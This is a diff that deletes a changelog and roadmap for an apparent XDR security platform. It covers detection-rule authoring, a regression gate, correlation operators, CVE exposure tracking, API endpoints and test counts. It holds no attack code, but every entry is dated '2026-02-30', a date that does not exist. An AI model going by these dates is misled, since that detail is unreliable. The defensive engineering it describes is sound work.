-    * `INFERRED`     analytical relationship, not directly observed
-      (deliberately never auto-marked from the client)
-  * Honest gaps preserved — missing tactics are listed explicitly
-    with a "not completed with inferred stages" note.
-
-**Selection sync — one investigation surface:**
-Both panels drive `setSelection({kind})` on click.  Existing panels
-that consume `useSelection()` (Evidence Trajectory highlight, IOC
-enrichment, technique markers) sync automatically.  Clicking a
-technique in ATT&CK Chain highlights the matching evidence + rule +
-process across the workspace.
-
-**Semantic contract preserved end-to-end:**
-```
-Rule → Observation → Correlation → Evidence Bundle →
-IKG → ICE → Verdict → Incident → Playbook / Policy
-
-Process ≠ malicious · LOLBIN ≠ malicious ·
-Detection ≠ verdict · IOC match ≠ compromise ·
-ATT&CK mapping ≠ verdict
-```
-
-**Verified live on `nivxray-xdr.vercel.app`:**
-* Both panels present on Investigation tab · zero page errors
-* Empty-state test case (`Phase1` incident with only 1 URL indicator)
-  renders honest "no process evidence" and "no ATT&CK-mapped
-  evidence" messages — never fabricates a tree/chain.
-* Bundle size: `XdrIncidentDetailPage` 131 KB → 154 KB
-  (Process Tree + ATT&CK Chain + selection wiring).
-
-**Deferred to next chunks (explicit backlog):**
-* Rule Studio · Visual Condition Builder wiring (AST + recursive UI
-  are authored in `src/xdr/rule-studio/`, still not wired into the
-  New-Rule wizard textarea).
-* "Integrations-style card grid" launcher for
-  Endpoint / Incident / Genealogy / Hunt modes of Process Tree.
-* Auto-assembled Investigation Report incorporating Process Tree +
-  ATT&CK Chain.
-* Process Genealogy & Behavioral Analytics **engine** (server-side
-  correlation of rare/abnormal chains feeding IKG → ICE).
-
----
-
-## ✅ 2026-02-30 · Investigation tab · KILL_CHAIN black-screen fix — SHIPPED
-
-**Symptom:** clicking *Investigation* on any incident produced a black
-screen.  Root cause: the Tactic Ribbon (ce4eceb) referenced
-`KILL_CHAIN` but the mitre import list only pulled
-`RULE_TO_TECHNIQUE` and `TECHNIQUE_INDEX`, so
-`EvidenceFirstInvestigationWorkspace.jsx` threw
-`ReferenceError: KILL_CHAIN is not defined` at render.
-
-**Fix:** added `KILL_CHAIN` to the existing import in
-`src/xdr/investigation/EvidenceFirstInvestigationWorkspace.jsx`.  No
-behaviour change beyond the crash.  Verified live on
-`https://nivxray-xdr.vercel.app` — Investigation tab now renders the
-full workspace (Tactic Ribbon, Trajectory canvas, filter chips,
-Process Chain, Attack Story, Timeline) with **zero page errors**.
-
-**In-flight (paused during the fix):**
-
-* Rule Studio · Visual Condition Builder — canonical AST layer
-  (`src/xdr/rule-studio/conditionAst.js`) and recursive UI
-  (`src/xdr/rule-studio/VisualConditionBuilder.jsx`) have been
-  authored (AST → validation → Sigma-compatible JSON), but the
-  New-Rule wizard still uses the JSON textarea.  Wiring the builder
-  into the wizard is the next chunk.
-
----
-
-## ✅ 2026-02-30 · P1 · Rule Studio scaffold (Step 1 + Step 2) — SHIPPED
-
-**Authoritative authoring layer**.  ONE surface, 9 owner-locked lanes.
-No competing authoring surfaces permitted.
-
-**Backend (`routers/xdr_rule_studio.py`, 192/192 xdr tests pass · 9 new
-Rule Studio tests):**
-
-* Nine locked lanes: `event · endpoint · ioc · network · dns_proxy ·
-  cve_exposure · correlation · behavior · content`.
-* Mandatory lifecycle persisted on EVERY rule (`lifecycle_state` +
-  `lifecycle_history[]`):
-  `DRAFT → TESTING → VALIDATED → ENABLED → ACTIVE → TUNING →
-  DISABLED → DEPRECATED`.  Illegal transitions refused with a
-  deterministic `LIFECYCLE_TRANSITION_REFUSED` error.
-* **11-check Regression Gate** (owner-locked, corrected from 10):
-  schema · data_source · positive · negative · false_positive ·
-  correlation · corpus · performance · rbac · provenance · license.
-  `POST /rules/{id}/promote` refuses ACTIVE unless every check PASSes.
-  SKIP does NOT count as PASS.  Failure returns
-  `REGRESSION_GATE_FAILED` with the full gate object.
-* **Architectural semantic stamping on every persisted rule** (non-
-  negotiable): `emits='OBSERVATION'`, `emits_verdict=False`,
-  `verdict_capable=False`, `capability_not_verdict=True`.
-* Correlation rules **mirrored into the SAME `xdr_detection_rules`
-  collection** with `lane='correlation'` — one authoritative store.
-* Idempotent metadata backfill at boot — total rule count is
-  UNCHANGED by the backfill (no synthetic rules).
-
-**New endpoints (RBAC-gated + audit-logged):**
-```
-GET  /api/xdr/rule-studio/status
-GET  /api/xdr/rule-studio/lanes
-GET  /api/xdr/rule-studio/rules
-POST /api/xdr/rule-studio/rules
-POST /api/xdr/rule-studio/rules/{id}/transition
-POST /api/xdr/rule-studio/rules/{id}/promote
-POST /api/xdr/rule-studio/rules/{id}/gate        # dry-run · no state change
-```
-
-**Frontend (Vercel · `jpreddy017/nivxray-xdr` main → `960b16f`):**
-* NEW `/xdr/rule-studio` — full shell:
-  * 9-lane switcher with live per-lane counts
-  * Lifecycle filter strip (all 8 states) with live counts
-  * Rule table filterable by lane / lifecycle / free-text
-  * Rule detail drawer with full 11-check gate visualisation
-    (PASS · FAIL · SKIP · UNKNOWN per check, with reason)
-  * Type-aware **New Rule wizard** (creates DRAFT rules)
-  * Promote button enforces the hard gate architecturally in the UI
-* Sidebar: `Detect › Rule Studio` (top of lane)
-* `/xdr/detect/studio` redirects to `/xdr/rule-studio`
-* No lane bodies yet — foundation only (per owner directive)
-
-**Investigation graph zoom (owner clarification 2026-02-30):**
-* Zoom `−` / `+` buttons on the canvas toolbar are REQUIRED.
-* Mouse-wheel and touchpad-pinch zoom are DISABLED — zoom is driven
-  ONLY by the explicit `−` / `+` buttons + Fit view.
-
-**Investigation graph — ATT&CK Tactic Ribbon + Parent-Child Process Chain + Technique Breakdown Popover (owner-approved 2026-02-30):**
-* NEW `TacticRibbon` above the Evidence Trajectory canvas — renders the
-  14 ATT&CK tactics; only tactics with evidence in the current
-  investigation are enabled.  Derived from Evidence → observed
-  technique → ATT&CK mapping → tactic.  **Never from the verdict.**
-  Clicking a tactic filters the canvas (nodes/edges without that
-  tactic dim to 12%); "Clear filter" pill appears while active.
-* NEW `TechniqueBreakdown` popover — clicking an active tactic reveals
-  a compact popover listing the observed techniques for that tactic
-  (technique ID + name · evidence count · hosts/users/procs/rules
-  affected · first-seen / last-seen · click → highlight technique
-  on canvas).  Anti-fabrication guard: a technique with 0 evidence
-  rows is retained only if it appeared as a first-class technique
-  node in the graph.  Never derived from verdict.
-* NEW `ProcessChainPanel` in the right sidebar — indented parent → child
-  process ancestry derived from process nodes + parent_of edges.
-  Honest empty state when there is no process evidence.
-* No minimap re-introduction — the tactic ribbon + technique popover
-  are the compact navigation layer; the Evidence Trajectory remains
-  the primary spatial visualisation.
-
-**Semantic contract preserved end-to-end:**
-```
-RULE → OBSERVATION → CORRELATION → EVIDENCE BUNDLE → IKG → ICE →
-VERDICT → INCIDENT → PLAYBOOK / POLICY
-```
-Verdicts are owned by the Verdict Engine.  Rules NEVER emit verdicts.
-
-**Locked queue for next chunk (order unchanged):**
-3. ✅ *(started 2026-02-30)* Event + Endpoint + IOC + Network lane
-   **field vocabularies** shipped (`lib/lane_schemas.py`); wizard
-   renders lane-specific field chips + real-world templates.
-   **Next**: visual condition builder replacing the JSON textarea for
-   the four foundation lanes.
-4. DNS/Proxy + CVE/Exposure + Content lane bodies
-5. Correlation lane absorption — retire `/xdr/admin/correlation-rules`
-6. Behavior / Heuristic / Anomaly lane
-7. Tuning Center
-8. Corpus 8 → 50 → 100
-9. Large-scale real content acquisition
-
----
-
-
-## ✅ 2026-02-30 · P1 · CVE / Vulnerability Intelligence & Exposure Pillar — SHIPPED
-
-**First-class pillar, not a single engine.**  Delivers the complete
-Vulnerability & Exposure lane end-to-end.
-
-**Backend (`routers/xdr_cve.py`, 183/183 xdr tests pass):**
-* NVD ingestion (bundled + live opt-in) via unified content_pipeline
-* CISA KEV correlation (embedded per CVE record with date_added + due date)
-* EPSS score + percentile per CVE
-* CVSS v3 (baseScore, vector, severity) normalized
-* CPE 2.3 matching against software inventory
-* Vendor advisory framework (references[] persisted, adapter planned)
-* Asset inventory + Software inventory (tenant-scoped, RBAC-gated)
-* **Deterministic 6-state Exposure Machine (evidence-gated):**
-  ```
-  CVE_PRESENT → AFFECTED_SOFTWARE → VULNERABLE_ASSET
-              → EXPLOITABLE → EXPLOITATION_OBSERVED → COMPROMISE_EVIDENCE
-  ```
-  Each transition REQUIRES its own evidence bucket.
-  Higher states are NEVER inferred from lower states.
-
-**Bundled snapshot (12 real CVEs, all with real CVSS/KEV/EPSS):**
-Log4Shell (CVE-2021-44228) · Zerologon (CVE-2020-1472) · EternalBlue
-(CVE-2017-0144) · Follina (CVE-2022-30190) · Chrome libwebp
-(CVE-2023-4863) · Palo Alto CVE-2024-3400 · ScreenConnect
-(CVE-2024-1709) · NetScaler CVE-2023-3519 · Citrix CVE-2019-19781 ·
-Ivanti CVE-2024-21887 · regreSSHion (CVE-2024-6387) · ActiveMQ
-(CVE-2023-46604).
-
-**Endpoints (all RBAC-gated + audit-logged):**
-```
-POST /api/xdr/cve/sync                — deterministic ingestion
-POST /api/xdr/cve/ensure-synced       — idempotent boot sync
-GET  /api/xdr/cve/status              — pillar status + states
-GET  /api/xdr/cve/list                — catalog (kev/severity/epss filters)
-GET  /api/xdr/cve/{id}                — single CVE
-POST /api/xdr/cve/assets              — register tenant asset
-GET  /api/xdr/cve/assets              — list tenant assets
-POST /api/xdr/cve/software            — register software row (asset↔vendor↔product)
-GET  /api/xdr/cve/software            — list software rows
-POST /api/xdr/cve/exposures/compute   — deterministic recomputation
-GET  /api/xdr/cve/exposures           — computed exposures with evidence buckets
-```
-
-**Frontend (Vercel · `jpreddy017/nivxray-xdr` main → `6159b70`):**
-* NEW `/xdr/exposure` — Vulnerability Exposure page
-* Renders pillar stats + 6-state machine strip with live per-state counts
-* CVE catalog with KEV / severity / EPSS filters
-* Asset + Software minimal inventory management (inline forms)
-* Exposure table shows evidence bucket names — never states without evidence
-* Sidebar: `Intelligence › Vulnerability Exposure`
-* `/xdr/cve` redirects to `/xdr/exposure`
-
-**Capability registry honesty updates:**
-* CVE engines flipped to CONNECTED where wired (9), IMPLEMENTED where
-  backend-only (2), NOT_YET_INTEGRATED where honest gaps remain (3 —
-  correlation→CVE bridge, verdict bridge, remediation prioritization)
-* **NIST correction**: `engine.nist_mapping` flipped from claimed
-  "consumed by XDR" to `xdr_integrated=False · ADOPTED`.  NivXRay Tool
-  has NIST content; XDR native wiring is honestly `NOT_YET_INTEGRATED`.
-* Registry summary: **150 caps · 61 CONNECTED · 39 ADOPTED · 13
-  IMPLEMENTED · 4 SCAFFOLD · 7 EXTERNAL_AVAILABLE · 26
-  NOT_YET_INTEGRATED · 105 verified backend paths**.
-
-**Semantic contract preserved end-to-end:**
-```
-CVE ≠ vulnerable asset ≠ exploitable ≠ exploited ≠ compromised
-Detection ≠ Correlation ≠ Policy ≠ Playbook ≠ Verdict
-PowerShell ≠ malicious · LOLBIN ≠ malicious · IOC_MATCH ≠ compromise
-```
-
-
----
-
-## 📋 P1 · Next locked queue — Detection Engineering / Rule Studio
-
-Owner directive (2026-02-30, revised) — after CVE, evolve current
-`/xdr/detections` + `/xdr/detect/tuning` + `/xdr/admin/correlation-rules`
-into ONE unified **Rule Studio** that owns EVERY authoring lane.
-
-**Non-negotiable architectural separation** (this is the whole point):
-```
-  RULE  →  OBSERVATION  →  CORRELATION  →  EVIDENCE BUNDLE
-        →  IKG  →  ICE  →  VERDICT  →  INCIDENT  →  PLAYBOOK / POLICY
-```
-A rule NEVER produces a verdict.  It produces an OBSERVATION with
-capability / signal strength / severity / confidence / ATT&CK.  The
-existing Verdict Engine remains the single source of truth for
-verdicts.  Examples:
-* `rundll32.exe executed`      → `LOLBIN_CAPABILITY` observation, NOT MALICIOUS
-* `CVE-XXXX affects software`  → `EXPOSURE` observation, NOT COMPROMISED
-* `SigmaHQ rule fires`         → `DETECTION` observation, NOT INCIDENT
-
-### Rule Studio lanes (Detect › Rule Studio)
-
-```
-Rule Studio
-├── Event / Log Source          Event ID · provider/channel · application ·
-│                               log source · field/value · severity/action/result
-├── Endpoint / EDR              process · parent/child · command line ·
-│                               file/hash/signature · registry · service ·
-│                               scheduled task · persistence · network conn ·
-│                               LOLBAS capability
-├── IOC / Threat Intelligence   IP · domain · URL · hash · email ·
-│                               certificate · IOC lists · TI confidence/reputation
-├── Network / IDS / IPS         Snort · Suricata · protocol · port · signature ·
-│                               payload/metadata · network behavior
-├── DNS / Proxy                 DNS query · domain · DGA · NXDOMAIN ·
-│                               frequency · destination · URL/category ·
-│                               proxy action
-├── CVE / Exposure              CVE · CPE · affected software/version ·
-│                               CVSS · EPSS · KEV · asset exposure ·
-│                               exploit evidence
-├── Correlation                 sequence · temporal · threshold · value count ·
-│                               group by · cross-source · cross-host ·
-│                               cross-user · negative evidence
-│                               (absorbs current /xdr/admin/correlation-rules)
-├── Behavior / Heuristic /      behavioral patterns · frequency deviations ·
-│   Anomaly                     baselines · heuristic features · ML observations
-└── Content-based               Sigma · YARA · Snort · Suricata · ATT&CK
-                                analytics
-```
-
-### Rule lifecycle (never a toggle)
-
-```
-DRAFT → TESTING → VALIDATED → ENABLED → ACTIVE → TUNING → DISABLED / DEPRECATED
-Test → Tune → Regression → Approve → Enable
-```
-
-### Regression Gate — HARD gate before ACTIVE (**11-check**)
-
-All 11 checks MUST pass; any single failure blocks ACTIVE.  This is
-enforced **architecturally** — the `POST /rules/{id}/promote` endpoint
-computes every check and refuses transition on any failure.  Documentation
-alone is not sufficient.
-
-```
-✓ Schema valid
-✓ Data-source availability
-✓ Positive tests pass
-✓ Negative tests pass
-✓ False-positive tests pass
-✓ Correlation tests pass
-✓ Investigation Corpus pass
-✓ Performance acceptable
-✓ Tenant / RBAC approved
-✓ Provenance valid
-✓ License valid
-```
-
-### Rule outputs (never a bare "alert")
-
-Every rule authored in Rule Studio emits:
-`observation_type · signal_strength · severity · confidence ·
-attack_techniques · tactic · evidence_fields · risk_contribution ·
-entity · dedup_key · correlation_key · verdict=NOT_SET`.
-
-### Tuning Center — Why it fires + Why it's noisy
-
-Not just an exclusion textbox.  Every rule tuning surface shows:
-* Matches / TP / FP / Unknown / Precision
-* Top FP dimensions (parent process · user · host · signer · time window)
-* **Why fired** breakdown per event (matched conditions + contributing evidence)
-* **What would make this rule NOT fire?** (deterministic explainer)
-* Suggested tuning candidates classified as:
-  * Rule modification (logic too broad)
-  * Exception (rule correct, environment-specific benign)
-  * Scope restriction
-  * Suppression
-  * Threshold change
-
-### Enforcement modes on every rule / policy
-
-`MONITOR → ALERT → SIMULATE → ENFORCE`
-Dangerous response: `DRY RUN → REQUIRE APPROVAL → AUTOMATIC`.
-
-### Order of implementation (locked · owner-approved 2026-02-30)
-
-```
-1. Rule Studio shell
-        ↓
-2. Rule lifecycle + 11-check Gate infrastructure
-        ↓
-3. Event + IOC + Endpoint + Network lanes
-        ↓
-4. DNS/Proxy + CVE/Exposure + Content lanes
-        ↓
-5. Correlation lane absorption
-   (retire /xdr/admin/correlation-rules — engine stays, UI absorbed)
-        ↓
-6. Behavior / Heuristic / Anomaly lane
-        ↓
-7. Tuning Center
-        ↓
-8. Corpus 8 → 50 → 100
-        ↓
-9. Large-scale real content acquisition
-```
-
-### Anti-fake-rule rule (architectural invariant)
-
-Rule Studio MUST NOT be artificially populated with fake rules to make
-the UI look complete.  What may appear immediately:
-* every existing real detection registered by the multi-source pipeline
-  (Sigma · Snort · Suricata · YARA · MITRE ATT&CK) — surfaced under the
-  correct lane
-* explicitly-marked `source: NivXRay-native` rules
-Everything else must come from actual upstream/licensed content going
-through the same 10-stage content pipeline and 11-check regression gate.
-
-### Enforcement discipline (architectural, not documentation)
-
-* Rule creation stamps the semantic separation on every persisted rule:
-  `emits: OBSERVATION`, `emits_verdict: false`, `verdict_capable: false`
-* Promotion endpoint refuses transition unless all 11 gate checks pass
-* Correlation lane persists into the same `xdr_detection_rules` collection
-  with `lane: correlation` so there is ONE authoritative rule store
-* Observations emitted by rule execution are stamped
-  `capability_not_verdict: true` and never write to the verdict store
-
----
-
-
-## ✅ 2026-02-30 · P0-C · Content Pipeline + Collector Catalog + Full Engine Registry — SHIPPED
-
-**Architectural framing accepted (owner directive):**
-`NivXRay XDR = NivXRay Tool + XDR Platform`.  Every existing Tool
-engine is **ADOPTED**, not rebuilt.  External open-source content is
-**INTEGRATED** through license/provenance validation.  Only truly
-missing capabilities are **NEW**.
-
-**Unified Content Pipeline (`/app/backend/lib/content_pipeline.py`):**
-Single 10-stage adapter used by ALL sources — no source-specific shortcuts:
-```
-DISCOVER → DOWNLOAD (live → bundled fallback → UNAVAILABLE)
-        → PARSE → LICENSE_EVALUATE → SCHEMA_VALIDATE
-        → NORMALIZE → DEDUPLICATE → ATT&CK_MAP
-        → REGISTER → COMPLETE
-```
-
-**License Policy Engine (`/app/backend/lib/content_policy.py`) — 4 states:**
-* `PERMITTED`       — MIT · Apache-2.0 · BSD · DRL 1.1 · CC0 · MITRE ATT&CK
-* `RESTRICTED`      — GPL-2.0/3.0 · LGPL · AGPL · CC-BY / CC-BY-SA · MPL — activatable, redistribution obligations surfaced
-* `LICENSE_REVIEW`  — unknown/custom — retained for audit, NOT activatable
-* `LICENSE_BLOCKED` — proprietary / no-redistribution — retained, NEVER activatable
-
-**Multi-source Detection Registry (`routers/xdr_detection_content.py`):**
-| Source        | Bundled snapshot                         | Rules | License                        |
-|---------------|------------------------------------------|-------|--------------------------------|
-| SigmaHQ       | fixtures/detection/sigma_snapshot.json   | 20    | DRL 1.1 / NivXRay-Public       |
-| Snort         | fixtures/detection/snort_snapshot.json   | 8     | BSD-3-Clause / GPL-2.0         |
-| Suricata      | fixtures/detection/suricata_snapshot.json| 7     | BSD-3-Clause                   |
-| YARA-Rules    | fixtures/detection/yara_snapshot.json    | 9     | GPL-2.0 / CC-BY-4.0            |
-| MITRE ATT&CK  | fixtures/detection/attack_snapshot.json  | 12    | MITRE ATT&CK                   |
-
-**56 real rules · 31 unique ATT&CK techniques · 45 PERMITTED · 11 RESTRICTED · all LIVE from bundled.**
-
-**Predefined Collector Catalog (`/app/backend/lib/collector_catalog.py`):**
-17 curated templates across 8 categories (Endpoint · Network · DNS ·
-Web · Cloud · Identity · Email · Container).  Each entry references a
-protocol from the honest IMPLEMENTED / SCAFFOLD / BLOCKED registry.
-
-**New backend endpoints (RBAC-gated + audit-logged):**
-```
-GET  /api/xdr/detection/sources/catalog     — per-source acquisition state + policy
-POST /api/xdr/detection/sync?source=<name>  — per-source deterministic sync
-GET  /api/xdr/detection/policy              — license policy matrix
-GET  /api/xdr/collectors/catalog            — 17 predefined templates
-```
-
-**NivXRay Capability Registry v2 (`docs/NIVXRAY_CAPABILITY_REGISTRY.json`):**
-Rewritten from 46 → **150 REAL engines across 12 domains** with rich
-per-engine metadata (Purpose · Consumes · Produces · NivXRay Tool
-existing · XDR integrated · External available · Open-source project ·
-License · APIs · Tests · Notes).  **NO fake engines.**  Auto-verified:
-**94 backend paths physically exist on disk**.
-
-Honest status buckets (owner-mandated):
-```
-CONNECTED           52   Wired end-to-end (XDR UI + API + tests)
-ADOPTED             39   Base engine present, XDR consumer exists
-IMPLEMENTED         11   Engine exists · not yet in XDR UI
-SCAFFOLD             4   Vocabulary + config · no adapter yet
-EXTERNAL_AVAILABLE   7   Open-source ready to integrate
-NOT_YET_INTEGRATED  37   Planned · no code yet (CVE pillar mostly)
-```
-
-**12 domains inventoried:**
-Intelligence & Investigation (16) · Command & Decode (5) · Artifact
-Analysis (9) · Detection · Correlation · Verdict (26) · Endpoint/EDR
-(9) · Network/NDR (7) · Threat Intelligence/OSINT (14) · Vulnerability
-& Exposure (14) · Identity/Cloud/SaaS (8) · Investigation/Report/IKG
-(16) · Response/SOAR (6) · Platform/Data plane (20).
-
-**Frontend — deployed to Vercel:**
-* Admin › Engines completely rewritten — status buckets are clickable
-  filters; per-engine drawer shows the full metadata schema.
-* **NEW  /xdr/kb**    — native Knowledge Base consuming `/api/kb`.
-* **NEW  /xdr/docs**  — native Documentation consuming `/api/docs`.
-* `/kb` and `/docs` redirect to the native XDR pages.
-* Detection Registry rewrite — per-source acquisition state
-  (LIVE / BUNDLED_FALLBACK / UNAVAILABLE), per-source sync, license
-  policy legend + license-state stat strip.
-* Correlation Rules + Detection Registry — stale-button fix: busy
-  state · disabled · spinning icon feedback on Refresh / Sync.
-
-**Backend regression: 179/179 pass** (previous 156 + 11 new content
-pipeline + 12 widened consolidation tests). Ruff clean.
-
-**Semantic contract preserved end-to-end:**
-```
-PowerShell ≠ malicious · LOLBIN ≠ malicious · CVE ≠ vulnerable
-Vulnerable ≠ exploitable · Exploitable ≠ exploited
-Exploited ≠ compromised · Detection ≠ verdict · IDS signature ≠ compromise
-```
-
-**Next phases (P1 · locked queue):**
-1. CVE / Vulnerability / Exposure pillar (NVD · KEV · EPSS · CVSS · CPE · vendor advisories)
-2. Investigation Corpus 8 → 50 scenarios
-3. Regression Gate (positive/negative/FP before enable)
-4. OSINT adapter integration (VT · AbuseIPDB · OTX · URLhaus · MalwareBazaar · MISP)
-5. Endpoint / Network / Identity native analytics (persistence, DGA, impossible-travel, MFA abuse)
-
----
-
-
-## ✅ 2026-02-30 · P1 · Detection Surface Consolidation (option a) — SHIPPED
-
-**Problem:** Four overlapping detection surfaces made it impossible to tell which was authoritative:
-`Admin › Detection Rules` (legacy verdict weights) · `Admin › Detection Content` (legacy static summary) · `Admin › Detection Registry` (new P1) · `Detection Engineering` (authoring workstation). Counts disagreed.
-
-**Fix:**
-* **Detection Registry** (`/api/xdr/detection/*`) is now the SINGLE SOURCE OF TRUTH.
-* Both legacy admin surfaces relabelled **"· DEPRECATED"** in the sidebar. Opening them shows a loud `DeprecatedBanner` with a "Go to Detection Registry" action. **No data or functionality removed**.
-* `Detection Engineering` (top-level) carries a new **Consolidation Notice** ("ONE AUTHORITATIVE REGISTRY") + link, and states that authoring here promotes into the same `/api/xdr/detection` registry — no parallel rule store.
-* Sidebar rewrites under **Detect**: Detection Registry → Correlation Rules → Detection Engineering (authoritative first, authoring last).
-
-**Backend invariants (`test_xdr_detection_consolidation.py`):**
-1. `/status` counts ≡ `/rules` count ≡ ATT&CK-union count (self-consistent).
-2. Every real-source rule carries FULL provenance (9 fields).
-3. Every `original_content_hash` is a valid SHA-256.
-4. No legacy endpoint returns registry-shaped rules.
-5. Registry reads require `detections.read` (single RBAC path).
-
-**Live Vercel E2E:** `nivxray-xdr.vercel.app` bundle `index-t3RCLBSn.js` — 3 legacy surfaces show correct banners, `/xdr/admin/detection-registry` shows 20 / 20 / 20 with real provenance and `CAPABILITY ≠ VERDICT` marker on the LOLBIN observation rule.
-
-**Full backend regression: 146/146 pass · ruff clean.**
-
-**Roadmap (locked-in sequence per your directive):**
-1. ✅ Detection Surface Consolidation
-2. ⏭️ Investigation Corpus 8 → 50 scenarios
-3. ⏭️ Regression Gate (positive/negative/FP per rule)
-4. ⏭️ Correlation → IKG → ICE → Verdict bridge
-5. ⏭️ **CVE / Vulnerability Intelligence & Exposure Engine** (elevated to a first-class pillar per your new directive — not buried under OSINT)
-6. ⏭️ Sigma / Elastic / MITRE ATT&CK real acquisition (20 → thousands)
-7. ⏭️ OSINT / TI Hub, 100 predefined rule pack, Corpus 100
-
-
----
-
-## ✅ 2026-02-30 · P1 · Correlation Engine — REAL STATEFUL ENGINE SHIPPED
-
-**Directive:** Build a real stateful event-stream correlation orchestrator
-between Detection/Observations and the existing IKG/ICE/Verdict stack.
-Never reimplement those engines. Never emit a verdict from correlation.
-
-**Backend (`/app/backend/routers/xdr_correlation.py`):**
-
-Real per-entity sliding-window engine — 13 operators IMPLEMENTED:
-`EVENT_MATCH · TEMPORAL · TEMPORAL_ORDERED · SEQUENCE · COUNT ·
-THRESHOLD · VALUE_COUNT · GROUP_BY · ENTITY_CORRELATION · CROSS_SOURCE ·
-CROSS_HOST · CROSS_USER · NEGATIVE_EVIDENCE`.
-
-**CRITICAL invariant:** correlation matches emit **CORRELATION_OBSERVED / CANDIDATE / SUPPORTED** — **NEVER a verdict**. Every match doc carries `capability_not_verdict: True`. Final significance is decided downstream by IKG → ICE → Verdict.
-
-**Evidence chain shape (preserved per match):**
-`correlation_id · correlation_name · level · operator · entity_key ·
-matched_conditions · missing_conditions · signal_ids · detection_ids ·
-raw_event_ids · evidence_chain (per-step signal payload) ·
-attack_techniques · window_start/end · provenance · capability_not_verdict`
-
-**5 bundled correlation rules seeded at boot** covering the mandatory test scenarios:
-1. Office → PowerShell → External Connection (TEMPORAL_ORDERED)
-2. LOLBIN Spawned From Office (parent-child capability observation)
-3. Brute Force Then Success (SEQUENCE)
-4. Cross-host Credential Pivot (CROSS_HOST)
-5. Detection Without Follow-up (NEGATIVE_EVIDENCE)
-
-**Endpoints (all RBAC-gated + audit-logged):**
-```
-GET  /api/xdr/correlation/status    — honest counts + operators
-GET  /api/xdr/correlation/rules
-POST /api/xdr/correlation/rules
-POST /api/xdr/correlation/rules/{id}/enable
-POST /api/xdr/correlation/rules/{id}/disable
-POST /api/xdr/correlation/signals   — evaluate signals, persist matches
-POST /api/xdr/correlation/replay    — dry-run replay with full trace
-GET  /api/xdr/correlation/matches
-```
-
-**RBAC:** `correlation.read / create / update / delete / publish / test`.
-Audit: `CORRELATION_RULE_CREATED / _ENABLED / _DISABLED · CORRELATION_REPLAY`.
-
-**Live E2E on Vercel-linked backend (proof of the acceptance criterion):**
-```
-Real signals (3) → Detection dets (2) + event (1)
-                → Stateful correlation (TEMPORAL_ORDERED)
-                → Evidence chain (3 steps · HOST-LIVE)
-                → CORRELATION_SUPPORTED
-                    · matched: A, B, C
-                    · missing: (none)
-                    · ATT&CK: T1204.002 · T1059.001 · T1071.001
-                    · capability_not_verdict: True
-```
-
-**Frontend (`CorrelationRulesBody.jsx`, live on Vercel):**
-Stats grid (Total / Active / Matches / Supported / Candidates / Operators),
-Rules tab with operator + window + ATT&CK badges, Matches tab with
-matched-vs-missing badge, evidence-chain length, entity_key, ATT&CK
-chips, and a "Replay demo chain" button that exercises the Office →
-PowerShell → external scenario end-to-end and persists real matches
-for operator review.
-
-**Tests · 17/17 pass (P1 correlation):**
-Bundle+operators honest count · BENIGN → no match · SUSPICIOUS →
-CANDIDATE · MALICIOUS → SUPPORTED · FALSE POSITIVE (non-Office parent)
-→ no Office match · Brute force → SUPPORTED · CROSS_HOST → SUPPORTED
-with pivot list · NEGATIVE_EVIDENCE → CANDIDATE · Multi-stage timeline
-produces multiple matches · dry_run does NOT persist · RBAC negative
-(3 write paths) · scoped-user read · tenant isolation · audit event
-recorded · deterministic (same input → same output).
-
-**Full backend regression: 141/141 pass** (124 previous + 17 new). Ruff clean.
-
----
-
-
----
-
-## ✅ 2026-02-30 · P1 · Detection Content Registry — FOUNDATION SHIPPED
-
-**Directive:** Build a real, populated, executable detection-content
-registry — never fabricate rules to reach a target number.
-
-**Backend (`/app/backend/routers/xdr_detection_content.py`):**
-
-10-stage deterministic sync pipeline (mirrors the proven LOLBAS pattern):
-```
-DISCOVERED → DOWNLOADED → PARSED → LICENSE_VALIDATED
-           → SCHEMA_VALIDATED → NORMALIZED → DEDUPLICATED
-           → ATT&CK_MAPPED → REGISTERED → COMPLETE
-```
-
-* **Allowed licenses:** DRL 1.1 · MIT · Apache-2.0 · BSD-3-Clause · NivXRay Public Content
-* **Rule lifecycle states:** IMPORTED · VALIDATED · COMPILED · TESTED · ENABLED · ACTIVE
-* **Failure states (never ACTIVE):** INVALID · PARSE_FAILED · LICENSE_BLOCKED · UNSUPPORTED · REGRESSION_FAILED · DISABLED
-* **Bundled snapshot:** `/app/backend/fixtures/detection/sigma_snapshot.json` — 20 real DRL-1.1 licensed rules with full provenance (source, source_url, license, hash, author, dates) so a cold-boot pod is NEVER empty
-* **Boot-sync:** non-blocking, idempotent — same pattern as LOLBAS
-* **RBAC-enforced:** every mutation requires `detections.publish`, reads require `detections.read`
-* **Audit-logged:** `DETECTION_SYNCED`, `DETECTION_RULE_ENABLED`, `DETECTION_RULE_DISABLED`
-* **Detection ≠ Verdict preserved:** the `capability_not_verdict` flag is normalized and rendered in the UI
-
-**Endpoints:**
-```
-POST /api/xdr/detection/sync                (fallback cascade + idempotent)
-POST /api/xdr/detection/ensure-synced       (boot entry point)
-GET  /api/xdr/detection/status
-GET  /api/xdr/detection/rules               (filter by source/type/attack/state/enabled/q)
-GET  /api/xdr/detection/rules/{id}
-POST /api/xdr/detection/rules/{id}/enable   (rejects invalid-state rules → 409)
-POST /api/xdr/detection/rules/{id}/disable
-GET  /api/xdr/detection/versions
-```
-
-**Live registry state on Vercel-linked backend:**
-
-| Metric | Value |
-|---|---|
-| Total rules       | **20** |
-| Valid rules       | **20** |
-| ATT&CK techniques | **20** (T1027, T1047, T1053.005, T1059.001, T1071, T1071.001, T1071.004, T1078.004, T1098, T1105, T1110, T1114.003, T1197, T1204.002, T1218.005, T1218.007, T1218.010, T1218.011, T1547.001, T1566.001) |
-| Sources           | 2 (SigmaHQ, NivXRay-native) |
-| Rule types        | 7 (process_creation, parent_child, field_match, regex, threshold, registry, ioc) |
-
-**Combined coverage with LOLBAS (33 techniques): ~50 unique ATT&CK techniques from real, licensed content with full provenance.** When SigmaHQ upstream is reachable the same pipeline scales to thousands — but the numbers displayed will always emerge from imported content, never a target.
-
-**Frontend (`DetectionRegistryBody.jsx`, deployed to Vercel):**
-* SYNCED / BUNDLED · OK status badges
-* Real stats (Total / Valid / Active / ATT&CK / Sources / Rule types)
-* ATT&CK coverage chip strip — union of real rule tags
-* Filterable rule table with source, upstream_id, author, ATT&CK, state, CAPABILITY marker
-* Sync now + Refresh + Enable/Disable actions
-
-**Tests · 15/15 pass:**
-CRUD + boot-sync populated + license blocking + ATT&CK extraction
-shape + technique-count-is-union + dedup + idempotency + bundled
